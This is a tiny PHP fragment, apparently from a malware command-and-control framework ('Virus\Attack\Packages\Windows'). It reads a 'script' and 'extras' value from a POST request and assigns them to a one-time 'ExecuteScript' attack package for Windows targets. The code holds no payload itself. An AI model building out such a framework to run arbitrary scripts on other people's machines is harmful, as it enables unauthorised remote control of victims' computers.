<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExecuteScript\ExecuteScript $this */

$this->setScript($this->requestData->postCheck("script"));
$this->setExtras($this->requestData->postCheck("extras"));
